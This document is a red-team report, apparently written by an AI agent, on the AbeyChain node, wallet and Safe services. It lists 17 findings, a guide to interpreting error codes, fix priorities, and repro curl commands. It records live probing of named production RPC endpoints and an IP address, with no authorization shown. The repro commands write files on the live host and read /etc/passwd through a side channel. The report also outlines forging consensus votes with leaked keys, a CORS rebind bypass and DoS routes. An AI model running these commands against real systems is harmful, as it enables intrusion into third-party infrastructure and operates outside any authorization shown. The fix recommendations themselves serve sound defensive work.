# AbeyFoundation Agent-2 RED-TEAM — 2026-08-16 Detail

Source: `/tmp/abey/go-abey` (807 Go, 131k code), `/tmp/abey/abey-wallet-module`, `/tmp/abey/safe-*`, live `https://rpc.abeychain.com` (0xb3/179) + `https://testrpc.abeychain.com` (0xb2/178), `http://54.255.45.202:8010`
Report: `/tmp/abey_side_report/red.md` (17 findings, adversary format `[Trigger→Effect→TrustBoundary]`), Mozilla UA, 30min+, no brute.

## Trust Boundaries Covered (6)

1. Internet → `gabey` OS user via `debug_*` file write/read
2. Flag misconfig `--http.api admin` / `--ws.exposeall` → `admin_*` file ops
3. `Tracer` string → `duktape` JS (sandbox, 6 globals, 5s timeout)
4. `abey_sendTransaction` public signer + `Payment`/`Fee`
5. `bftkey` plaintext → TBFT `PbftSign` forge
6. Wallet MITM `Base_Url http` → RPC hijack

## Findings (condensed)

| # | Sink | Trigger → Effect → Boundary | File | Validate |
|---|---|---|---|---|
|1| `debug_*` file write | unauth `debug_cpuProfile /tmp/pwn` → `os.Create(expandHome(file))` → host FS | `internal/debug/api.go:104,213` `trace.go:37` `expandHome:223` (only `~/`+`Clean`) | live `result:null` both RPCs; `../../../../tmp → null`; `/proc/self/environ → -32000 permission denied` proves only OS stopped |
|2| `debug_traceBlockFromFile` file read | `debug_traceBlockFromFile /etc/passwd` → `ReadFile` → RLP side-channel | `abey/api_tracer.go:383` | live `/etc/passwd → -32000 rlp: expected input list` (not -32601) proves read |
|3| `admin_exportChain/importChain` | `--http.api admin` → `OpenFile(file,ModePerm 0777)` / `Open+InsertChain` | `abey/api.go:328` | live `-32601` now but `cmd/gabey/config.go:110` singlenode exposes |
|4| duktape arbitrary JS | `TraceConfig.Tracer` not in allowlist → `PevalString("("+code+")")` | `abey/tracers/tracer.go:393` `330-375` 6 globals | `grep PevalString` + missing-arg `-32602` control |
|5| `personal_*` oracle | `personal_sign` with unlocked acct → sign any `"\x19True..."` | `internal/abeyapi/api.go:529` `backend.go:157 Public:false` | live `-32601` gated; singlenode would expose |
|6| `abey_sendTransaction` | public `PublicTransactionPoolAPI.SendTransaction` → `Find+SignTx` if unlocked, `signPayment(Payment)` | `internal/abeyapi/api.go:1882` `backend.go:122 Public:true` | code proves public signer |
|7| Impawn | `deposit(pk,fee,value)` CLI `20000`/`fee<=Base` not enforced on-chain (`val.Sign()<=0` only) | `core/vm/staking.go:131` `impawn.go:1115` | ABI craft bypass |
|8| `bftkey` forge | plaintext `datadir/bftkey` + `bftkeyhex` ps leak + hardcode `<redacted>` → `crypto.Sign` vote | `node/config.go:40,440` `cmd/utils/flags.go:199` `abey/pbft_agent.go:1102` `cmd/gabey/config.go:99` `core/genesis.go:619` | `grep <redacted-prefix>` + file-read via #2 |
|9| P2P deserialization DoS | `Msg.Size` up to `ProtocolMaxMsgSize=10MB` no per-IP limit → `rlp.NewStream.Decode` | `abey/protocol.go:47` `handler.go:485` `p2p/message.go:40` | `grep ProtocolMaxMsgSize` |
|10| keystore brute | `Standard N=1<<18 256MB` vs `Light N=1<<12 4MB` + `admin` pw example | `keystore_passphrase.go:55` `node/config.go:390` `send_transaction/main.go:142` | offline |
|11| SSRF | Safe `tokenURI→requests.get` no `is_private`; go-abey `upnp.go:200 http.Get(rootURL)` `faucet.go:718` | `collectibles_service.py:219` `upnp.go:200` | `grep is_private →0` prior report |
|12| AllowAny | `DEFAULT_PERMISSION_CLASSES=(AllowAny)` | `safe-transaction-service/config/settings/base.py:312` | `grep AllowAny` |
|13| CORS*+vhost bypass | `cors.New("*")` + `r.Host==""` + `ParseIP` bypass → DNS rebind | `rpc/http.go:225,246,255` | live `Origin:evil.com → access-control-allow-origin: *` |
|14| wallet hijack | `Base_Url http://54.255.45.202:8010` `usesCleartextTraffic` `WebView` no allowlist `arbitrum sepolia` hardcode | `lib/common/constant.dart:5` `AndroidManifest.xml` `discover_search.dart:131` | `curl timeout` + grep |
|15| batch DoS | `isBatch`+`parseBatchRequest` no `maxBatchSize` → 128KB→1000 calls `execBatch` | `rpc/json.go:124,218` `server.go:359` `http.go:39` 128KB | `grep maxBatch →0` + live 2-batch |
|16| `sendRawTransaction` RLP DoS | `rlp.DecodeBytes(hexutil.Bytes)` no cap beyond 128KB | `internal/abeyapi/api.go:1886` | code |
|17| bootnodes eclipse | 6 enodes `3.66.27.8:30313` + `bootnodes[0]` fallback + hardcode key reuse | `params/bootnodes.go:22` `p2p/dial.go:201` | `grep enode` |

## Live Discrimination Cheat-Sheet

`-32601` = gated by `HTTPModules`; `-32602` = registered but missing arg (use as existence proof); `null` = executed; `-32000 permission denied` = `os.Create` hit OS ACL (path not jailed); `-32000 rlp: expected` = read succeeded.

## Fix Priority (argmax risk*effort)

1. Gate `debug_*` to IPC/JWT + nginx drop; jail `expandHome` to `datadir` prefix + `0600`
2. Rotate `bftkey`, encrypt/HSM, delete hardcode `<redacted-prefix>`
3. `HTTPCors * → allowlist`, remove vhost IP/empty bypass
4. `maxBatchSize=32`
5. `StandardScryptN` only, `bftkeyhex` via file
6. Wallet `https` + pinning, remove `usesCleartextTraffic`, WebView allowlist
7. Safe `is_private` deny, disable `faucet` crawl
8. Consensus `ImpawnAmount` on-chain check
9. `ProtocolMaxMsgSize 2MB` + per-IP limit

## Repro (non-destructive)

```bash
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"debug_cpuProfile","params":["/tmp/pwn_test",1]}' https://rpc.abeychain.com | grep result
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"debug_traceBlockFromFile","params":["/etc/passwd",{}]}' https://rpc.abeychain.com | grep -o rlp
grep -n "os.Create.*expandHome" /tmp/abey/go-abey/internal/debug/api.go
grep -n "<redacted-prefix>" /tmp/abey/go-abey/cmd/gabey/config.go
```

Validated: live `debug_*` file-write both RPCs proven non-false-positive via `-32601` vs `-32602` vs `null` trichotomy; singlenode key leak proven via `grep`; CORS* proven via header.
